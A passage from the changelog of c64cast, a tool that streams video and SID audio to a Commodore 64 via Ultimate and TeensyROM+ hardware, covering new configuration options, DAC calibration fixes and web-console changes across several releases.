  console's dismissible update banner (`GET /api/update`), and, on the appliance
  image, a login line via the new config-free `c64cast --motd-line`. After 30
  days with no answer at all, both say *that* instead of quoting one that old.
  Nothing is ever installed automatically.

- **`[ultimate64].system` defaults to `"auto"`** and is read from the Ultimate's
  live System Mode at startup. It feeds the CPU clock, the frame rate, the DAC
  NMI latches and the SID PLAY rate; a hand-set value that disagrees with the
  machine now logs a warning and is an error-level `--doctor` finding. Falls
  back to NTSC under `--skip-probe` or on a backend without the setting.

- **`[ultimate64].sid_play_rate`** (default `"auto"`) sets the CIA #1 Timer A
  latch to a vsync tune's own frame rate — see the PAL-tempo fix below. `"off"`
  restores the previous behavior, and a number in Hz pins every vsync tune to
  one rate. CIA-timed (multispeed) tunes self-time and are never overridden.

- **`[ultimate64].sid_video_mode`** (default `"off"`) switches the U64's System
  Mode so its PAL/NTSC timing matches `[ultimate64].system`, correcting SID
  *pitch* — about two thirds of a semitone. Opt-in because it retimes the HDMI
  output (576p50 rather than 480p60); applied live and volatile, followed by a
  C64 reset, and restored at teardown. Ultimate 64 only.

- **`[ultimate64].hdmi_scan_resolution`** (default `"auto"`) drives the U64's
  HDMI upscaler. `"auto"` raises SD to HD only when `sid_video_mode` retimed the
  machine; `"keep"` never touches it; a scan-mode label pins it for the run.
  Newer U64 boards only.

- **`[hardware].host_sid_model`** (`auto` | `6581` | `8580` | `unknown`) —
  declare the SID chip model in the C64 being driven, for links that cannot read
  the SID hardware state. `auto` assumes 6581 on NTSC / 8580 on PAL and warns
  once per run; `unknown` opts out; ignored where the live SID state is readable
  (Ultimate 64).

- **`[hardware].host_sid_chips`** describes a machine with an internal dual-SID
  mod (`{ d400 = "6581", d420 = "8580" }`), so each declared chip gets its own
  verdict against a tune on links that cannot read the SID hardware. Supersedes
  `host_sid_model`.

- **`[hardware].host_sid_tune_match`** (default `"off"`) picks tunes your C64's
  own SID chips can play when a `waveform` scene points at a directory or glob:
  `"prefer"` tries the fits first, `"require"` drops the misfits, and both fall
  back to the whole pool with a warning when nothing fits. Needs `host_sid_chips`
  or an explicit `host_sid_model`.

- **The Ultimate II+'s emulated stereo SIDs are routed, panned and leveled like
  the U64 mixer.** A spare *enabled* side is retargeted to any uncovered chip
  address, `sid_panning` / `sid_volume` are applied to `Pan/Vol EmuSid1/2`, and
  your config comes back at teardown (a side that was disabled is never
  touched). `sid_model` now matches chip models here too, rather than only
  reporting them, moving `Filter Curve` and `Combined Waveforms` together.

- **One log line saying what you will actually hear.** After routing, model
  matching, panning and volume have settled, c64cast reads the hardware back and
  reports the source, model, level and pan answering each of the tune's chip
  addresses, plus anything else still audible. A chip that ends up unmapped,
  muted or on a model the tune did not ask for makes the line a warning.

- **The connect-time log identifies the device** — model, serial and firmware
  (`Ultimate II+ 5D327C (firmware 3.14d, FPGA 122)`, or a TeensyROM+'s USB
  serial number) — because an IP or serial path names an endpoint, not a
  machine, and `192.168.2.64` is the factory default any number of Ultimates
  answer to.

- **New audio warnings**, each once per run: a multi-SID tune on a link that
  cannot route chips (naming the address and both readings of it); a tune
  loading into the RAM under `$D400-$D7FF` on an Ultimate II+; an undeclared
  host SID model; and, when the two audio outputs disagree, which one to listen
  to. Extra SID chips are now also silenced at scene teardown, not just `$D400`.

- **`--doctor` reports unknown config keys as findings** — a warn-level row
  under a new `CONFIG` heading, named by file, table and key, and counted in the
  summary, instead of a stray warning printed above the report. **"Did you
  mean"** now also searches every other section, so a key that is spelled right
  but lives elsewhere (`palette_mode` under `[color]`) is told where it belongs.

- **A video scene's "UP NEXT" name prefers the file's own `title` tag** over its
  filename — a cheap header-only probe, so it costs nothing on files without
  one. URLs already had a real title from yt-dlp.

- **A recorded video's `copyright` line is real when the source offers one** —
  yt-dlp's site-declared `license` and `uploader`, or a local file's
  `copyright` / `rights` container tag. Falls back to `unknown` exactly as
  before when the source has nothing.

- **Video scenes draw a buffering bar on the C64 while they load** — a
  diagonal-striped bar along screen row 22 through the blocking setup work, in
  every display mode; the first video frame wipes it.
  `[video].setup_progress_bar = false` turns it off.

- **`--calibrate-dac` says so on the C64 itself** — a centered title and a
  computed duration line, painted before the first capture; the screen is never
  touched again, so mid-run DMA cannot drop NMI samples and skew the
  measurement.

- **`scripts/diags/video_render_probe.py` now times the host as well as the
  link** — decode / render / total milliseconds per frame, which side binds the
  source frame rate, a `--threads N` pin so two machines compare by single-core
  speed, and `decode_ms` / `render_ms` in the per-frame CSV. Compose cost tracks
  the *source resolution*, not the display mode, so pre-scaling the media is
  usually the fix.

- **`[color].flicker_tolerance` — colors the C64 cannot draw, by alternating two
  of the ones it can.** The bitmap modes hold two screen pages over one shared
  bitmap and flip between them every video field, so the eye fuses each cell's
  pair into an intermediate shade — the trick Dragon Breed and Mayhem in
  Monsterland used. A C64-side raster IRQ drives the alternation at the VIC field
  rate no matter how fast the host is pushing, so it needs no unusual link
  speed, no REU and no sampler — just one extra ~1000-byte page per frame. What
  it fixes is **gradient banding**: a chromatic gradient improves 27-34% in the
  hires modes and a photograph ~1%, but in `mhires`, where four colors share a
  4-pixel-wide cell, a photograph improves 4-32%. Needs `palette_mode =
  "percell"`; the global-4 modes have no per-cell decision for a pair to win,
  and arming says so. `flicker_tolerance` is a cut across a table of pairs
  scored by eye, blind — `"off"` (default), `"clean"`, `"subtle"`, `"visible"` —
  and which pairs qualify follows `[hardware].host_palette`, because what fuses
  is the light a particular machine emits. `[color].flicker_max_luma_delta`
  (default 0.075) bounds the brightness gap that governs the seizure hazard and
  warns rather than refuses. The fused result does not survive a 30 fps capture,
  but c64cast's own preview and `[recording]` reconstruct it correctly.
  `scripts/diags/flicker_score_grid.py` and `[color].flicker_score_pairs` are
  how the table grows. **Off by default, deliberately — see Upgrade notes.**

### Changed

- **c64cast is Beta, not Alpha.** The PyPI trove classifier moves from
  `Development Status :: 3 - Alpha` to `4 - Beta` — four tagged releases in, with
  a settled CLI, config schema and data-directory layout. Nothing about running
  it changes; the `0.x` line still carries no API-stability promise.

- **British spellings are gone from the prose, the code and the console.**
  American English is now the rule for prose, code, comments, identifiers and
  commit messages alike, written down in CLAUDE.md and CONTRIBUTING.md so it
  stops drifting. `grey`/`gray` and `canceled`/`cancelled` are interchangeable
  and both stay; the `grey` color alias still resolves, as it always has.

- **`--version` reports the install directory** after the number. `__version__`
  reads the *installed* distribution's metadata, so unpacking a release archive
  into a working directory moves nothing and the old number keeps being correct
  — a true statement about a different install than the reader changed. The path
  names the environment and the tool that owns it: `uv/tools/`, `pipx/venvs/`,
  or a checkout.

- **Hires picks each cell's color by fitting the whole cell**, not by sampling
  one pixel of it. A hires cell gets two colors and one is the global
  background, so the remaining choice decides most of the frame — fitting the
  cell cuts reconstruction error about a quarter on photographic content
  (−24% mean Lab, holding across every `dither` setting), and it is *stabler*
  than a one-pixel read, which follows sensor noise directly: a static subject
  under noise now stops rewriting the screen. Costs ≈0.8 ms/frame.
  `[color].hires_cell_pick = "sample"` restores the old behavior.

- **A bad scene is refused before the machine is opened.** Config validation now
  checks each `[[scenes]]` block — an unknown `type`, a `generative` `source`
  that does not exist, a `duration_s` on a video scene — including
  `follower_only` scenes, with the same exit code (3) and message plus the name
  of the scene that failed. The web console's **Check** and **Save** get this
  for free.

- **The session lifecycle moved out of `cli.py` into
  `c64cast/app/session.py`** — five composable steps (`validate_configs`,
  `build_session`, `start_services`, `run_foreground`, `teardown_session`) over
  a `Session` object, so a longer-lived host can start, stop and restart a
  session. `cli` re-exports every moved name (`build_stack`, `teardown_stack`,
  `_run_playlists`, `StackBuildError`, …), so anything importing them keeps
  working, and config validation is now hardware-free and separable from the
  build.

- **The `#:schema` line no longer needs maintaining.** `c64cast
  --print-schema-path` prints the value for a config's first line — the schema
  inside the running install — and since an upgrade rewrites that file in place,
  the line stays true release after release. `c64cast --doctor` reports a
  directive that has gone stale (pinned to another version, a path that no
  longer resolves, or a copy of the schema whose contents differ), judged by
  content rather than location, and never rewrites the file. The User's Guide
  now tells you to ask for the path rather than type a version-pinned URL.

- **The User's Guide has an
  [Upgrading](https://github.com/kfox/c64cast/blob/main/docs/guide/04-setting-up.md#upgrading)
  section** — extras do not accumulate, there is a way to check that an upgrade
  worked, and the one mistake the three-line version invites (unpacking a
  release archive over a working directory) is answered in both troubleshooting
  appendices. A release's own notes now lead with how to install or upgrade,
  with the wheel and tarball labeled for the installers that fetch them.

### Fixed

- **PAL SID tunes no longer play ~20% fast.** The C64-side player chained PLAY
  onto the KERNAL's CIA #1 Timer A interrupt, which the KERNAL runs at ≈60 Hz on
  *both* standards — so a tune composed for PAL's 50.12 Hz ran at 60.0 (**+19.7%
  tempo**), across roughly 80% of a full HVSC. `[ultimate64].sid_play_rate` sets
  the latch to the tune's own frame rate; the oscilloscope's host emulator now
  ticks at the real PLAY rate too, which also fixes a latent scope/audio desync
  under `system = "PAL"`.

- **The KERNAL CIA #1 restore latch was the wrong standard's.** The ASID ring
  player and the REU audio pump both wrote `$4025` (PAL's) back at teardown, so
  the jiffy clock ran ~3.8% fast on NTSC after either one until the next reset.
  Both now go through `c64.kernal_cia1_latch(system)`.

- **Colors are matched against the palette your machine actually emits.**
  c64cast measured everything against the VIC-II rendering regardless — an
  Ultimate 64's output is about 25 counts per channel away, 60 on Orange — so on
  a U64 the quantizer sent **18.8% of pixels** to the wrong color, worst on the
  grays, browns and orange. New `[hardware].host_palette` defaults to `"auto"`,
  which asks the machine (an Ultimate 64 reports its own palette; anything else
  is driving a real VIC-II). Set `"u64"`, `"pepto"`, or the path of a VICE
  `.vpl` file to state it outright.

- **Double-buffered bitmap video no longer tears when the link is busy.** A host
  DMA write halts the C64 CPU for about a microsecond per byte, so an 8 KB
  bitmap push stalls it through ~128 raster lines and a bank-swap IRQ meant for
  vblank could run deep in the visible picture — 1.2% of frames split, seam
  about a third of the way down. The handler now checks where the raster is and,
  if it has been pushed past the safe window, stages the frame and commits on a
  later field. Frame rate unchanged; re-measured at zero splits over 1796
  frames (0.28% with flicker blending).

- **The preview window and recording follow a double-buffered scene to the bank
  it actually swapped to.** `render()` read a fixed `$2000`/`$0400` while the
  real swap — driven by a C64-side raster IRQ the host never issues — lands on
  the other bank, so the mirror was a frame stale (ghosting under motion) and
  showed a wrong-bank fusion under `flicker_tolerance`, the one place
  `caveats.md` says to judge from the recording. It now follows the frame
  tracker's own pending-bank byte.

- **The console's token no longer travels further than the terminal.** The login
  URL carries the token, and both `--log-file` and the console's log buffer
  (served over the state feed to every client, a read-only viewer included)
  carried it too. Both now redact to `token=REDACTED`, keyed on the `token=`
  suffix so `viewer_token` and anything added later are covered; the rest of the
  line survives. Treat any token in an older log or bug report as public and
  restart the host to mint a fresh one.

- **A saved configuration no longer absorbs your machine's settings.** Every
  save-back measured "is this worth writing?" against the shipped defaults
  instead of the machine-settings layer, so saving a show config on the machine
  with the capture card wrote that machine's `[video] device` into the file —
  which then overrode the *next* machine. The web console form, the `--init`
  wizard and the on-C64 menu now measure against the machine layer. In the
  console, a machine-supplied value shows as unchanged and **Clear** puts the
  machine's value back rather than the shipped default; a DMA password living in
  machine settings no longer blocks editing an unrelated config.

- **A validation error names the file it came from.** A config is checked with
  your machine settings underneath it, so one stray value in
  `~/.config/c64cast/settings.toml` refused *every* config with an error naming
  only a section. Both editors now name the setting, its value and the source
  file — and only when all three are true: the machine supplies it, the edited
  file is silent about it, and the failure mentions it by name.

- **The console's config list stops showing the packaged examples** with the
  Examples box unchecked, and a checkout's stray `.toml` with them —
  `pyproject.toml`, `mise.toml`, each book's `book.toml`, and the `scripts/` and
  `docs/` trees. A directory named in `config_roots` is still listed in full.

- **One name for a configuration, everywhere the console shows one** — every
  surface now renders the short form, the config root label and the `.toml`
  suffix dropped, any subdirectory kept.

- **Check and Save flag a scene that names media that is not there** — a warning
  rather than a refusal, since a file may arrive before showtime or belong to
  another machine in an ensemble. URLs and globs are left alone.

- **Unsaved config edits survive leaving the screen** — edits belong to the
  console now, not the screen, and the Configs tab carries a dot while any are
  outstanding.

- **The console's finder falls back to descriptions** when a query matches no
  setting name — `cell_strategy` is not a word anybody guesses.

- **The console no longer scrolls sideways on a phone** — one long log line or
  one absolute path used to make the whole page wider than the viewport.

- **A refused start says why, everywhere it can be tried.**
  `session.SessionConfigError` now carries the same diagnostic `validate_configs`
  logs, so the `422` names the actual scene or setting; the shell's tab-bar
  Start button hands the refusal to the Session screen instead of swallowing it
  into the browser console.

- **The web console pre-flights a config before claiming a start or switch.**
  `launch()` — the one function every launch surface goes through — checks the
  config first and refuses locally if it would not run.
  `POST /api/configs/{ref}/validate` now returns a `diagnostics` list
  (`doctor.validate_load_result`), so a bad config names everything wrong at
  once instead of one problem per click, and validates the file as it stands on
  disk when called with no body.

- **Deleting a config no longer says "stop it" after you already have** — the
  route now checks whether the supervisor is actually mid-show with that config,
  not just whether it is the last one named.

- **`[ultimate64].url` takes the address you already know how to write** —
  `u64://HOST`, or the bare `192.168.2.64` the shipped example promises, as the
  `http://HOST` both of them mean. A `?query` knob or a `tr://` target in that
  field is refused rather than applied.

- **The hires cell picker can be saved.** `cell_pick` is offered as a live knob
  by every control surface but was never connected to `[color]
  hires_cell_pick`; every save-back skipped it. It is now written like the rest
  of the color pipeline, and a test holds the mapping to the display modes' own
  registries so the next live knob cannot ship half-connected.

- **A recorded scene's description no longer hands you a `TODO`** — every video
  scene's `SCENE_CONFIG_JSON` carried `copyright: TODO: add source link /
  license / attribution`, printed straight into the block you paste under a
  video. It now reads `unknown`, and says why.

- **Video scenes on the Ultimate Audio sampler path no longer stall ~2 seconds
  at startup** — `VideoScene` started the sampler's blocking prebuffer before
  the demuxer that feeds it. The demuxer starts first now.

- **`--calibrate-dac` no longer logs 404 tracebacks while isolating the mixer**
  — it now touches only the mixer items the machine's own snapshot reported, and
  a write that still fails aborts the run rather than silently measuring a
  half-isolated mixer.

- **An Ultimate II+ says up front that it has no SID config surface** instead of
  reading the firmware's empty-success answer for a missing category as real
  state and planning against it. The device's category list is probed once,
  after reachability is proven; SID tunes then play on whatever answers their
  addresses, with the model verdict from `[hardware].host_sid_model`.

- **The Ultimate II+'s Ultimate Audio sampler is detected again** — the probe
  now reads the sampler volumes from `Audio Output Settings` as well as the
  U64's `Audio Mixer` category, so a mapped and audible sampler is no longer
  silently downgraded to the 4-bit `$D418` DAC.

- **A tune routed onto an UltiSID core to match its chip model is now audible**
  — the fallback now disables `Auto Address Mirroring` and the physical socket
  it displaces, both already covered by the snapshot/restore.

- **SIGINT/SIGTERM always end the process.** A stuck teardown thread used to
  leave a run that would not exit and would not log why. The installed entry
  point now force-exits once nothing can stall it (flushing output and
  `--log-file` first), a second signal restores the default disposition for
  whichever signal actually arrived, and a paused scene's resume waits on the
  stop event rather than a bare `sleep(1)`. `--serve`'s host gained the same
  three-strike escape hatch the one-shot CLI already had.

## [0.3.0] - 2026-08-09

### Added

- **A TeensyROM+ inside an Ultimate needs `Bus Operation Mode = Writes`, and the
  documentation now says so.** On the firmware's `Quiet` default the pairing may
  play with a constant hiss under the audio, which reads as a c64cast audio
  problem and is not one — the fix is F2 → Cartridge and ROM Settings on the
  Ultimate, and no `[audio]` or `[dsp]` knob substitutes for it. c64cast can't
  provision this the way it does the REU and the sampler, because on that rig the
  connection is `tr://` to the TeensyROM+ and there is no link to the Ultimate
  whose setting it is. Documented in the User's Guide setup chapter, the
  reference guide's DAC section, `caveats.md` and `troubleshooting.md`.

- **`--calibrate-dac` now says which *kind* of unsteady a refused ring was.** A
  spread number alone cannot distinguish a capture whose level was still settling
  — where the ring replayed faithfully and only the level moved — from laps that
  genuinely play different levels, and the two have opposite fixes. Fitting one
  gain per pass separates them, and the failure now picks its cause list from
  that instead of listing everything: a drifting level is no longer blamed on a
  second SID that cannot have caused it. Marginal rings say which kind they are
  as they are measured.

- **A run whose rings are individually fine but collectively marginal now says
  so.** Rings sitting under the trust gate still add up: measured on one chip an
  hour apart, a run with a single marginal ring reproduced at corr 0.9994 / 0.78%
  RMS where a run with none managed corr 1.0000 / 0.00%. The table is still
  written; the run now reports how many rings cleared the healthy band and the
  worst of them, and the count is persisted with the metrics.

- **Audio worker health lines.** Under `-v`, the DAC path now logs a short line
  every few seconds — ring gap excursion, late ring sub-writes, underruns, write
  rate, consumer rate, NMI latch — and reports the session's late-write share on
  stop. The counts that already existed were session totals, which cannot tell a
  fault that is present throughout from one that appears part-way in, deepens,
  clears and returns; the artifacts worth chasing on this path are exactly the
  latter. "Late" means a ring sub-write reached its slot after that slot's
  deadline had passed, which bunches the rest of the chunk and undoes the spread
  described below, without registering as an underrun.

- `scripts/diags/audio_fm_probe.py` — measures how much a host DMA write
  perturbs DAC playback, as a function of payload size, against a tone that
  cannot underrun. Its siblings from the same investigations ship alongside
  it: `halt_shape_probe.py` (what a DMA write costs the 6510, in NMI ticks),
  `ring_race_probe.py` (the write head against the NMI consumer's read
  pointer), `write_delivery_lag.py` (how much of what the host believes it
  wrote is actually in C64 RAM), and `tr_clearloop_state_probe.py` (what the
  C64 is doing at each step of TeensyROM+ bring-up).

### Changed

- **Less data on the wire every frame, and no more stalls on scene cuts.** The
  delta-upload path decided how to split a changed region into writes by
  counting bytes, which is the wrong currency on socket DMA: a write there
  costs ~5.2 ms regardless of payload up to ~2.4 KB, so splitting a region into
  pieces multiplied its cost while the byte count obediently went down. It now
  prices both options against a per-backend measured cost model and picks the
  cheaper, and a change that covers most of a region pushes only the range that
  actually changed rather than re-uploading the whole thing.

  Measured on an Ultimate 64 over a minute of video per mode, at an unchanged
  write rate and frame rate: **~25% fewer bytes** on the host-DMA bitmap path
  (220 → 166 KiB/s) and **~28% fewer** in the character modes (41 → 30 KiB/s).
  Offline against the same clip, the frames that used to be split worst — wide
  sparse changes, i.e. scene cuts — went from 104 ms to 26 ms, and the mean
  frame from 18.1 ms to 13.3 ms.

  Nothing to configure. The bitmap figures are for the host-DMA path; an
  Ultimate with its REU enabled already stages `hires`/`mhires` bitmaps through
  the REU bank-swap instead, and those are unaffected (their screen and color
  RAM still benefit). TeensyROM+ playback is unaffected in kind: that link *is*
  byte-bound, and the same model keeps its existing chunking behavior.

- **The baked `mahoney_ultisid` table has been re-measured** against the
  emulated core in isolation. It reproduces the original curve almost exactly,
  but the code-selection step has been rewritten since that table was generated,
  and the shipped bytes had gone stale against it — non-monotonic through the
  very curve they came from. No action needed; the improvement is automatic for
  anyone whose `$D400` is an UltiSID core.

- **The 4-bit `$D418` DAC wobbles far less.** Each host write to the audio ring
  halts the C64's CPU for about one cycle per byte, and CIA #2 latches NMIs on an
  edge — so a write long enough to span two timer underflows makes the second
  sample vanish rather than merely arrive late. The ring write was one 1024-byte
  push, which at the 12 kHz default froze the CPU for roughly 12 NMI periods
  about 12 times a second, right in the 4-20 Hz band the ear is most sensitive to.
  It is now split into pieces that each fit inside one NMI period and spread
  across the chunk period. Measured on hardware against a 376 Hz carrier,
  frequency deviation drops from 27.3 Hz to about 6 Hz on both the Ultimate 64
  and TeensyROM+. There is no knob: the piece size is derived from the live NMI
  period and floored by what the link can carry, so a backend that cannot afford
  to split degrades to a single write on its own.

- `[audio].dac_calibration_profile` now also takes a **path** to a calibration
  file, used as given. A name is folded into one filesystem-safe token, so a path
  handed to it silently became a key matching no file — and a name can only ever
  address the current backend's own key space, which made it impossible to point
  a TeensyROM+ run at the calibration of the C64 it is plugged into (filed under
  the Ultimate's device id). Missing calibrations now name the file that was
  looked for instead of a mangled key.

- The `vision` extra's mediapipe pin is now `>=0.10.35,<1.1` (previously
  `<0.11`), so a fresh `c64cast[vision]` or `c64cast[all]` install resolves
  mediapipe 1.x. Existing 0.10.x installs remain within the pin; the
  hand-gesture controller works with either series.

### Fixed

- **Ctrl+C now always stops a headless run, and always tears down.** With no
  `[preview]` window the main thread waited on a plain `Thread.join()`, which
  CPython 3.14 parks in `_PyParkingLot_Park` — a wait no signal interrupts. The
  main thread therefore never returned to the interpreter, Python never ran a
  signal handler, and Ctrl+C did nothing at all: measured on a hung run, two
  SIGINTs produced no shutdown, no teardown and no final reset, leaving the
  machine mid-session. SIGTERM was equally stuck, so there was no graceful way
  out. Only runs with a preview window escaped, because pumping a window polls
  `is_alive()` anyway — which is why Ctrl+C seemed to work only sometimes. The
  headless join now polls, and SIGINT is handled explicitly alongside SIGTERM
  instead of riding `KeyboardInterrupt`, so an interrupt can no longer land
  inside teardown and abandon the run's final reset. A second Ctrl+C restores
  the default handler rather than exiting on the spot, so the third is what
  kills — cutting an in-flight DMA is what wedges the hardware.

- **Nothing writes to BLNSW (`$00CC`) any more.** Poking `$80` there to stop the
  kernal cursor blink never worked — the editor's input-wait loop overwrites that
  byte on every pass, so it is gone microseconds after the DMA lands. The BASIC
  clear-and-loop PRG is the mechanism that actually holds the cursor off, and it
  was already doing so everywhere the write claimed to help. The
  `suppress_cursor_blink()` helper is gone, and the TeensyROM+'s "is BASIC at the
  READY prompt?" check — which had been reading that state as a side effect of
  the same write — is now a plain read of CURLIN.

- **TeensyROM+ bring-up now actually detects the READY prompt.** The check for
  "is BASIC at the READY prompt, so the clear-loop repair needs to run?" tested
  CURLIN's high byte for `$FF`, the usual shorthand for direct mode. Measured on
  hardware that machine reads `$0000` at READY and `$0014` (line 20) running the
  clear loop, so the test matched neither state, every probe answered "running",
  and the repair never fired — leaving BASIC in the editor with a blinking
  cursor. Both spellings of "not executing a line" are now accepted.

- **TeensyROM+ bring-up no longer skips the clear-loop repair after a slow
  launch.** LaunchFile acks and then streams its own console text back over the
  same link, a C64 reset included. Bring-up waited a fixed 0.6 s for that and
  then probed, which on hardware was short: the probe's reply misaligned with the
  text and came back as the ASCII of `Remote Launch:`, so the state read failed,
  the repair took its can't-read-the-state early return, and BASIC was left in
  the editor — with exactly the blinking cursor the repair exists to prevent. The
  wait now drains the link until it goes quiet instead of guessing a duration.

- **A calibration measured on the Ultimate could not be replayed over a
  TeensyROM+.** A multi-socket file holds one table per socket, and choosing
  between them means knowing which socket answers `$D400`. A link with no SID
  config query cannot read that back — and "unknown" was being treated as the
  same answer as "an UltiSID core owns it, so no physical-chip table applies",
  so naming such a file in `[audio].dac_calibration_profile` reported it as
  holding no usable calibration and playback dropped to the 4-bit linear DAC.
  That is exactly the cross-backend reuse the option is documented for
  (measure over the Ultimate, replay over a cartridge in the same machine).
  Calibration runs now record which socket answered `$D400` before isolation
  began, and that record is believed on any link; a file predating it falls
  back to socket 1 — the default mapping — with a warning naming the assumption
  and how to retire it.

- **`--calibrate-dac` averaged glitched readings into the table, and later
  refused good runs because of them.** Individual capture slots occasionally read
  far off on one pass: across every refused capture kept for diagnosis, 1-6 codes
  out of ~86 glitched while the rest agreed to 0.004%. Those readings were folded
  into the affected code's level, and a wrong ladder entry is signal-correlated
  distortion — clean over a quiet passage, gross hiss once the material gets
  loud. Levels are now the median across passes, which discards the outlier
  outright, and the trust gate reads a 95th percentile instead of the worst
  single slot, so one transient no longer fails a ring that is otherwise perfect.
  Measured effect: a table measured over TeensyROM+ and one measured over the
  Ultimate, of the same 6581, went from agreeing at corr 0.844 / 18% RMS to
  **corr 1.0000 / 0.12%** — the figure two clean runs of one chip reproduce at.
  The link was never the variable.

- **A calibration profile named by a bare name could not refer to an existing
  file.** `--calibrate-dac` writes device-keyed names (`ultimate-<unique-id>`), but
  naming one of those in `[audio].dac_calibration_profile` resolved to
  `profile-ultimate-<unique-id>` and matched nothing — the obvious thing to type,
  since it is what is on disk. A name matching an existing file now wins; a name
  with no such file still gets the `profile-` prefix so new profiles file
  themselves as before.

- **A refused calibration capture is no longer discarded.** It is the only
  evidence for its own refusal, and repeating it costs a ~50 s hardware run that
  may not fault the same way. Refused captures are now written to
  `<data root>/calibration/unusable/`, with the codes, sample rate and
  diagnostics in the same file, and the failure names the path.

- **The test suite wrote a real calibration file into the developer's own data
  directory** on every run — `~/.local/share/c64cast/calibration/dac/` — because
  one test class persisted a calibration without redirecting `$C64CAST_DATA_DIR`.
  The isolation is now inherited rather than copied per class, so it cannot be
  omitted by a new one.

- **`--calibrate-dac` could write a wrong table from a capture whose levels
  moved.** Each pass of a capture drives the SID through identical codes, so a
  healthy rig's `pass_spread_frac` reads 0.01–0.2% — but the only gate was at
  10%, which exists to catch recording the room by mistake. A run reading
  0.6–2.5% therefore passed, and the table fitted to it agreed with the same
  chip's earlier table on 95 of 256 entries (correlation 0.565 — a worse mismatch
  than applying a *different chip's* table), after which `"auto"` preferred that
  file on every later run. Like any wrong ladder it is signal-correlated
  distortion: clean over a quiet passage, gross hiss once the material gets loud,
  so it presents as playback breaking partway in rather than as a bad
  calibration. Captures whose passes disagree broadly are now refused, with a
  message that says the input is right and asks what else is reaching that
  output; rings above 0.2% are marked marginal as they are measured. This is a
  check on the data, not on any particular link — a rig that reads in the healthy
  band is unaffected however it connects. **If a calibration of yours logged pass
  spreads near or above 1%, re-measure it** — or delete it and let `"auto"` fall
  back. (The gate this shipped with read the worst single slot, which refused
  good runs; see the slot-glitch entry under Fixed for what it reads now.)

- **A calibration measured over a link with no SID config API no longer applies
  itself silently.** Only the Ultimate can report which SID answers `$D400`, so
  every other link measures whatever is there and files it under one key. That is
  correct on a single-SID machine and a blend of two ladders on a machine with a
  second chip or with address mirroring on, and nothing on the host side can tell
  those apart — so the assumption is now logged where the table is chosen.

- **The static on the `$D418` DAC: a calibration table was being applied to the
  wrong SID.** `[audio].dac_curve = "auto"` chose the baked *emulated-UltiSID*
  table whenever the backend was an Ultimate, without checking which SID source
  actually answers `$D400` — the address the DAC writes to. On a board with a
  physical SID in a socket mapped there (the socket wins address mirroring, so
  the real chip is what you hear), that applied a ladder measured on different
  silicon: 19.4 dB worse than a table measured on the chip itself, and 17.6 dB
  worse than the plain 4-bit path. It is the constant buzz that made the 8-bit
  mode sound broken. `"auto"` now resolves the live `$D400` owner, and a
  populated socket with no calibration of its own falls back to the 4-bit path
  instead. **If you have a physical SID, run `--calibrate-dac` once** — a
  matched table beats the 4-bit path by 1.7 dB and runs 5.9 dB louder.

- **`--calibrate-dac` measured every socket after the first with unparked SID
  voices.** The 8-bit mode needs the three voices parked as DC sources, and that
  setup was written once at start-up, so it landed on whichever chip was mapped
  to `$D400` at the time. On a two-socket board the second socket's table was
  measured with no DC to scale. It is now re-installed after each routing change.

- **`--calibrate-dac` could measure a muted SID.** Routing a source to `$D400`
  does not make it audible — the Audio Mixer carries a separate per-source
  level. Calibration now routes the mixer to the source it is measuring and
  restores the previous levels afterwards. Previously this produced a capture at
  the noise floor, which looks like a broken capture device rather than a muted
  chip.

- **The audio underrun summary no longer contradicts itself.** It is emitted
  when the streamer stops, which happens once as a scene tears down and again at
  session teardown — so a run that reported real underruns was immediately
  followed by "clean session (no underruns)" from the second call, whose
  counters had just been cleared. The summary is now reported only for a run
  that actually fed the ring, and says "run" rather than "session", which is
  what it always counted.

- **Quick playback obeys every CLI flag again.** Playing media by positional
  argument (`c64cast clip.mp4`) built its config from a hand-picked handful of
  flags, so twelve of the twenty-one that the same command honors with
  `--config` were accepted and then silently ignored — among them
  `--frame-numbers`, `-D/--audio-device`, `--sample-rate`,
  `--dac-calibration-profile`, `--vision` and `--heartbeat`, plus the
  `C64CAST_DMA_PASSWORD` environment variable, which meant quick playback could
  not reach a password-protected Ultimate at all. Both front doors now share one
  merge, and a test asserts the whole flag map rather than the flags that
  happened to break.

- **TeensyROM: no more blinking cursor, and the BASIC clear loop actually
  runs.** LaunchFile left the clear-loop program at `$0801` with its link
  pointer zeroed, so BASIC saw an empty program and dropped back to READY —
  where the editor's input-wait loop blinks the cursor and, because that loop
  rewrites `$00CC` on every pass, no write could switch the blink off. Bring-up
  now detects it and repairs it over DMA. The editor also stops eating the
  keystrokes the on-C64 keyboard control reads.

## [0.2.1] - 2026-08-05

### Added

- **The documentation is a website.**
  [kfox.github.io/c64cast](https://kfox.github.io/c64cast/) publishes all three
  books — User's Guide, Programmer's Reference Guide, Performance Card — plus
  the caveats, troubleshooting and extending notes, rendered from the same
  Markdown the PDFs are set from and republished on every push to `main`. Each
  book gets a contents page, a chapter sidebar, prev/next paging and a link to
  its typeset PDF; a section link resolves identically on github.com, in the
  PDF and on the site, because all three use GitHub's own anchor rule. The
  renderer (`scripts/build_site.py`) is stdlib-only and shares its reading of
  the Markdown — and every check that reading makes — with the PDF builder, so
  the two cannot disagree about what a page says. `make site` builds it
  locally; a pull request now proves every book still renders, which previously
  nothing did until release day.

- **Every book has a permanent download link.** A release now carries each PDF
  twice — `c64cast-users-guide-X.Y.Z.pdf` as before, and an unversioned
  `c64cast-users-guide.pdf` — so
  `https://github.com/kfox/c64cast/releases/latest/download/c64cast-users-guide.pdf`
  (and the same for `c64cast-reference-guide.pdf` and
  `c64cast-performance-card.pdf`) always serves the current release. The README
  links all three that way; every past release keeps its version-stamped copy.

- **`--doctor` names the opencv build that actually loaded.** Every opencv
  wheel — plain, contrib, and the headless variants — unpacks into the same
  `cv2/` directory under a different distribution name, so an installer will
  co-install several and the last one written wins. Installing the `vision`
  extra (or `all`) brings `opencv-contrib-python` along with mediapipe, which
  means the `opencv-python` version c64cast pins is not the one that runs, and
  nothing said so. ENVIRONMENT now reports the build in place, flags it when
  more than one distribution is providing `cv2`, and warns when the winner is a
  headless wheel — the cause of `[preview]` opening no window.

### Fixed

- **DAC audio can no longer come up silent for a whole session.** On some
  machines a run would play no audio at all from the first frame to the last —
  never a dropout, never a recovery, and the video also ran noticeably fast.
  Three writes start the NMI audio consumer, and the write transport is built to
  absorb a dropped write rather than fail loudly; if any of the three went
  missing the consumer never started, and nothing on the host noticed (the fast
  playback was the pacing loop correctly chasing a reader that never read). The
  bring-up now checks that the consumer actually started and re-sends the writes
  if it didn't, up to five times, logging when a retry was needed and warning
  outright if it never takes. A consumer that dies mid-session also warns now
